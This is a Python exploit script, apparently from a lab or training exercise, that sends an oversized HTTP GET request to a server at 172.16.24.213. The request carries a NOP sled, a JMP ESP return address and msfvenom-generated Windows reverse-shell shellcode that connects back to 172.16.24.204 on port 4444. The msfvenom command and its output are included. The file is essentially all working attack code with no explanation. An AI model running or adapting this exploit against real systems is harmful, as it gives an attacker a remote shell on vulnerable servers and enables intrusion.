#!/usr/bin/python

import socket

host = "172.16.24.213"
port = 80

#JMP ESP 0x7e429353
jmp_esp ="\x53\x93\x42\x7e" 

# badchars: \x00 i \x0d

"""
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.24.204 LPORT=4444 -b "\x00\x0d" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
"""
buf =  b""
buf += b"\xba\x96\x17\x2e\x37\xd9\xc6\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x7d\xeb\xcc"
buf += b"\xc2\x7d\xfc\x93\x2d\x7d\xfd\xf3\xa4\x98\xcc\x33\xd2"
buf += b"\xe9\x7f\x84\x90\xbf\x73\x6f\xf4\x2b\x07\x1d\xd1\x5c"
buf += b"\xa0\xa8\x07\x53\x31\x80\x74\xf2\xb1\xdb\xa8\xd4\x88"
buf += b"\x13\xbd\x15\xcc\x4e\x4c\x47\x85\x05\xe3\x77\xa2\x50"
buf += b"\x38\xfc\xf8\x75\x38\xe1\x49\x77\x69\xb4\xc2\x2e\xa9"
buf += b"\x37\x06\x5b\xe0\x2f\x4b\x66\xba\xc4\xbf\x1c\x3d\x0c"
buf += b"\x8e\xdd\x92\x71\x3e\x2c\xea\xb6\xf9\xcf\x99\xce\xf9"
buf += b"\x72\x9a\x15\x83\xa8\x2f\x8d\x23\x3a\x97\x69\xd5\xef"
buf += b"\x4e\xfa\xd9\x44\x04\xa4\xfd\x5b\xc9\xdf\xfa\xd0\xec"
buf += b"\x0f\x8b\xa3\xca\x8b\xd7\x70\x72\x8a\xbd\xd7\x8b\xcc"
buf += b"\x1d\x87\x29\x87\xb0\xdc\x43\xca\xdc\x11\x6e\xf4\x1c"
buf += b"\x3e\xf9\x87\x2e\xe1\x51\x0f\x03\x6a\x7c\xc8\x64\x41"
buf += b"\x38\x46\x9b\x6a\x39\x4f\x58\x3e\x69\xe7\x49\x3f\xe2"
buf += b"\xf7\x76\xea\xa5\xa7\xd8\x45\x06\x17\x99\x35\xee\x7d"
buf += b"\x16\x69\x0e\x7e\xfc\x02\xa5\x85\x97\x80\x2a\x9d\xab"
buf += b"\xb1\x48\x9d\x22\x1e\xc4\x7b\x2e\x8e\x80\xd4\xc7\x37"
buf += b"\x89\xae\x76\xb7\x07\xcb\xb9\x33\xa4\x2c\x77\xb4\xc1"
buf += b"\x3e\xe0\x34\x9c\x1c\xa7\x4b\x0a\x08\x2b\xd9\xd1\xc8"
buf += b"\x22\xc2\x4d\x9f\x63\x34\x84\x75\x9e\x6f\x3e\x6b\x63"
buf += b"\xe9\x79\x2f\xb8\xca\x84\xae\x4d\x76\xa3\xa0\x8b\x77"
buf += b"\xef\x94\x43\x2e\xb9\x42\x22\x98\x0b\x3c\xfc\x77\xc2"
buf += b"\xa8\x79\xb4\xd5\xae\x85\x91\xa3\x4e\x37\x4c\xf2\x71"
buf += b"\xf8\x18\xf2\x0a\xe4\xb8\xfd\xc1\xac\xc9\xb7\x4b\x84"
buf += b"\x41\x1e\x1e\x94\x0f\xa1\xf5\xdb\x29\x22\xff\xa3\xcd"
buf += b"\x3a\x8a\xa6\x8a\xfc\x67\xdb\x83\x68\x87\x48\xa3\xb8"

buffer = "GET //.:/" + (1782) * "\x90" + jmp_esp + 20 * "\x90" + buf + (5095-9-1782-4 -len(buf)) * "C"

buffer += " HTTP/1.1\r\n"
buffer += "Host: 172.16.24.212\r\nUser-Agent FUZZ\r\nAccept: FUZZ\r\nConnection: close\r\n\r\n"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
print ("[+] Payload sent")
s.close()
